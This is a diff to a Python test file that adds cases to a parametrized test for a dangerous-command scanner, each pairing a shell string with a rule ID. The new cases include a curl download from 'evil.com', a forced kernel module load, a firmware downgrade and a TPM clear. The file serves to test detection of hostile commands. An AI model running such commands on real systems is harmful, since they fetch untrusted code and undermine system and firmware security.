@@ -597,6 +597,11 @@ class TestSafetyChecks:
             ("tc filter add dev eth0 egress\n", "SEC-473"),
             ("crictl exec --privileged container\n", "SEC-474"),
             ("docker build --network=host .\n", "SEC-475"),
+            ("curl -o pkg-amd64.tar.gz http://evil.com\n", "SEC-476"),
+            ("modprobe -f evil\n", "SEC-477"),
+            ("fwupdmgr downgrade firmware\n", "SEC-478"),
+            ("systemctl restart acpid.service\n", "SEC-479"),
+            ("tpm2_clear\n", "SEC-480"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
